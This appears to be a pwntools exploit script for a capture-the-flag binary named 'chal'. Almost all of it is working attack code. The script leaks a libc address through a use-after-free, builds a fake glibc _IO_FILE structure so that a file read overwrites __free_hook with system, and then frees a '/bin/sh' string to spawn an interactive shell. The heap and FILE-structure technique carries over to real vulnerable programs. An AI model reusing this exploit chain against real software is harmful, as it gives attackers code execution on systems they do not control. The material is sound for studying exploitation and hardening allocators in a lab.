from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

def FILE_write(target_addr: int, size: int, buf_addr: int):
    """
    - input : `target_addr (int)`, `size (int)`, `buf_addsr (int)` , `size` must bigger than `fread`'s size & `buf_addr + 8` is a valid address
    - output : `payload (bytes)` , payload of fake `struct _IO_FILE`
    """

    f = FileStructure()
    f.flags, f.fileno = 0xFBAD0000, 0
    f._IO_read_ptr = f._IO_read_end = 0
    f._IO_buf_base, f._IO_buf_end = target_addr, target_addr + size
    f._lock = buf_addr

    return bytes(f)[:-8]


r = process('./chal', env={'LD_PRELOAD': '/usr/src/glibc/glibc_dbg/libc.so'})

def add_user(idx, username):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', str(idx).encode())
    r.sendafter(b'> ', username)

def edit_user(idx, size, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())
    r.sendlineafter(b'> ', str(size).encode())
    r.send(data)

def del_user(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', str(idx).encode())

add_user(0, b'a')
edit_user(0, 0x10, b'a' * 0x10)

add_user(1, b'a')

del_user(0)

edit_user(1, 0x10, b'a')

r.sendlineafter(b'> ', b'4')
r.recvuntil(b': ')
libc = u64(r.recv(6).ljust(8, b'\0')) - 0x1bd261
info(f'libc : {hex(libc)}')
free_hook = libc + 0x1bfb28
buf = libc + 0x1bef00
system = libc + 0x48850

add_user(0, b'/bin/sh')

add_user(2, b'a')
edit_user(2, 0x10, b'a')
del_user(2)

edit_user(1, 0x1d0, FILE_write(free_hook, 0x210, buf))

r.sendlineafter(b'> ', b'4')
r.recvlines(3)

r.sendafter(b': ', p64(system) + b'a' * 0x200)

del_user(0)

r.interactive()
